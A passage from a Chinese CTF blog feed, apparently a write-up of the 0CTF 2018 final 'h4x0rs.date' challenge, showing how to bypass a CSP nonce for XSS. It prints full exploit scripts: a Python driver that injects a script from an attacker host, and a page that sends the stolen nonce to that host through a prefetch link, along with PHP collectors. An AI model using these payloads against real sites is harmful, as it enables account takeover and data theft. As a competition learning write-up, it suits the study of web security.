class="attr">csp</span>=<span class="string">"script-src 'unsafe-inline';"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，当我们访问user2资料时，便成功触发漏洞。</p><h2 id="【预期】拿到nonce，执行js"><a href="#【预期】拿到nonce，执行js" class="headerlink" title="【预期】拿到nonce，执行js"></a>【预期】拿到nonce，执行js</h2><p><a href="https://paper.seebug.org/166/#a-csscspdom-xss-three-way" target="_blank" rel="noopener">https://paper.seebug.org/166/#a-csscspdom-xss-three-way</a></p><p>之前自己一直想的是通过style来拿nonce，因为他有缓存。而且时间还可以。最后自己努力将时间控制在15s左右。但是发过去后发现，那边没有回显？自己chrome是66，bot是65。当时很迷，还问出题人来着。但出题人没有对这块进行答复，而是反问我，时间问题。并且说明bot只停留15s，你这样是不行的。</p><p>所以只好换思路。当时不知道脑子那根筋抽了，没想到自己加载他的js。最后比赛结束前半小时才发现这个问题。</p><p>然而因为需要一系列自动化脚本的编写。最终也没来得及写完。比赛结束后才勉强写出beta版本。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>此时因为缓存的原因，20s的缓存。也就是说，当前页面的静态文件时不会重新加载的。那么，我们在当前页面加载一个iframe，即<strong>eval.php</strong>，去加载js从而获取nonce。但是获取nonce需要传入id。</p><p>因为此时我们已经成功关注了admin，所以可以通过python在自己页面爬取到admin的id。</p><p>此时大概逻辑便有了。</p><p>1.获取到管理员id，并且传给服务器，保存到a.txt。</p><p>2.将user1的资料改为将eval.php作为iframe加载。eval.php会引入a.txt的id。</p><p>3.此时eval.php 成功拿到nonce，保存到b.txt。并且在5秒后加载user2的资料</p><p>4.紧接着，修改user2 的资料，写入evaljs，并且将b.txt中的nonce带上。</p><p>5.此时，一套流程便完成了。等待evaljs的执行即可。</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>大概用了以下几个脚本。写完没来得及做测试环境就关了。最近虽然环境一直开着，但是有些事给耽误复现了。</p><p>也就是说…..至今还未复现。</p><p><strong>poc.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取管理员id</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAdminid</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> re.search(<span class="string">"id=([0-9a-zA-Z]*)\"&gt;admin2&lt;"</span> , requests.get(<span class="string">"https://h4x0rs.date/profile.php"</span> , cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"p28vu9m2h0uj7g04m73uo4fsm6"</span>&#125;).text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从服务器端a.txt获取nonce</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNonce</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> requests.get(<span class="string">"http://eval.com/a.txt"</span>).text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改资料页内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reProfile</span><span class="params">(ec)</span>:</span></span><br><span class="line">url=<span class="string">"https://h4x0rs.date/profile.php"</span></span><br><span class="line">cookie=</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=8fut6nfo8f449hu3t6ft2qp3s3"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">"intro"</span>:ec,</span><br><span class="line"><span class="string">"submit"</span>:<span class="string">"submit"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(ec)</span><br><span class="line">r=requests.post(url,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送report</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendReport</span><span class="params">()</span>:</span></span><br><span class="line">codeurl=<span class="string">"https://h4x0rs.date/profile.php?id=428222d40f05cfc8f1a1f2b550b29952db37d2016899a9f2e0534f630739c1e4"</span></span><br><span class="line">requests.post(<span class="string">"https://h4x0rs.date/do_report.php"</span>,data=&#123;<span class="string">"url"</span>: codeurl,<span class="string">"submit"</span>: <span class="string">"submit"</span>&#125; , cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"p28vu9m2h0uj7g04m73uo4fsm6"</span>&#125;)</span><br><span class="line">print(<span class="string">"send url ok!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改user2资料页中的nonce</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeNonce</span><span class="params">(nonce)</span>:</span></span><br><span class="line">evalcode=<span class="string">"&lt;script src=//eval.com/eval.js nonce='"</span>+nonce+<span class="string">"''&gt;&lt;/script&gt;"</span></span><br><span class="line">reProfile(evalcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先获取到admin的id，并保存到b.txt</span></span><br><span class="line">id = getAdminid()</span><br><span class="line">requests.get(<span class="string">"http://eval.com/save_b.php?b="</span>+id)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送report，从而加载eval.php</span></span><br><span class="line">sendReport()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取nonce，并修改内容。</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">nonce=getNonce()</span><br><span class="line"><span class="keyword">if</span>(nonce !=<span class="string">''</span>):</span><br><span class="line">changeNonce(nonce)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p><strong>eval.php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;eval&lt;/title&gt;</span><br><span class="line">&lt;script src=&quot;https://h4x0rs.date/assets/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">         // 加载user2的资料页</span><br><span class="line">function aa()&#123;</span><br><span class="line">var iframe = document.createElement(&apos;iframe&apos;); </span><br><span class="line">iframe.src=&quot;https://h4x0rs.date/profile.php?id=1d70f9cca4ab0d188c0cc9524b0d92705607d9b0d2e3923841e8b194ac7601cc&quot;;  </span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">         </span><br><span class="line">$(document).ready( function () &#123;</span><br><span class="line">  //获取nonce</span><br><span class="line">           var m = $(&quot;meta[http-equiv=Content-Security-Policy]&quot;);</span><br><span class="line">  var nonce=m.attr(&quot;content&quot;);</span><br><span class="line"></span><br><span class="line">  // 通过savea.php将nonce保存为a.txt</span><br><span class="line">           var url=&quot;https://eval.com/save_a.php?a=&quot;;</span><br><span class="line">  var n0t = document.createElement(&quot;link&quot;);</span><br><span class="line">  n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class="line">  n0t.setAttribute(&quot;href&quot;, url+nonce);</span><br><span class="line">  document.head.appendChild(n0t);</span><br><span class="line">           </span><br><span class="line">           //每3秒重新加载一次user2的资料</span><br><span class="line">  setInterval(&quot;aa()&quot;, 3000 )</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;https://h4x0rs.date/assets/csp.js?id=&lt;?php echo file_get_contents(&apos;b.txt&apos;);?&gt;&amp;page=profile.php&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>save_a.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $myfile = fopen(<span class="string">"./a.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">    fwrite($myfile, $str);</span><br><span class="line">    fclose($myfile);</span><br><span class="line">&#125;</span><br><span class="line">save($_GET[<span class="string">'a'</span>]);</span><br></pre></td></tr></table></figure><p><strong>save_b.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $myfile = fopen(<span class="string">"./b.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">    fwrite($myfile, $str);</span><br><span class="line">    fclose($myfile);</span><br><span class="line">&#125;</span><br><span class="line">save($_GET[<span class="string">'b'</span>]);</span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这道题蛮棒的，话说l4wio大佬总是一次又一次刷新自己对xss的认识。最近0ctf，学到了很多套路。再一次感觉到xss的乐趣。想尽一切办法去bypass。但是切记不能忽视任何一个微小的细节。或许哪里就会是一个漏洞。</p><p>看过标答后，发现l4wio大佬的答案更有意思一点，在这里，我用了两个用户，而大佬，直接通过csrf修改admin资料，将admin作为第二个用户来构造xss。膜一下。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.lorexxar.cn/2018/05/31/0ctf2018-final/#h4x0rs-data" target="_blank" rel="noopener">https://www.lorexxar.cn/2018/05/31/0ctf2018-final/#h4x0rs-data</a></li><li><a href="https://github.com/l4wio/CTF-challenges-by-me/blob/master/0ctf_final-2018/0ctf_tctf_2018_slides.pdf" target="_blank" rel="noopener">https://github.com/l4wio/CTF-challenges-by-me/blob/master/0ctf_final-2018/0ctf_tctf_2018_slides.pdf</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当时比赛时，差一点就解出来了。结束前半小时，才发觉获取nonce的漏洞点。&lt;/p&gt;
&lt;p&gt;还是太菜了，否则能一跃第四。&lt;/p&gt;
&lt;p&gt;这题其实挺有意思的， 赛后仔细想想，好像也不是太难。但是题目真心不错。&lt;/p&gt;
&lt;p&gt;最后证实，这题有多种解法，但每一种解法，都感觉学到了很多。&lt;/p&gt;
&lt;p&gt;题目链接：&lt;a href=&quot;https://h4x0rs.date/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://h4x0rs.date/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web" scheme="http://kctf.github.io/categories/web/"/>
    
    
      <category term="xss" scheme="http://kctf.github.io/tags/xss/"/>
    
      <category term="nonce绕过" scheme="http://kctf.github.io/tags/nonce%E7%BB%95%E8%BF%87/"/>
    
      <category term="0ctf" scheme="http://kctf.github.io/tags/0ctf/"/>
    
      <category term="csp" scheme="http://kctf.github.io/tags/csp/"/>
    
  </entry>
  
</feed>
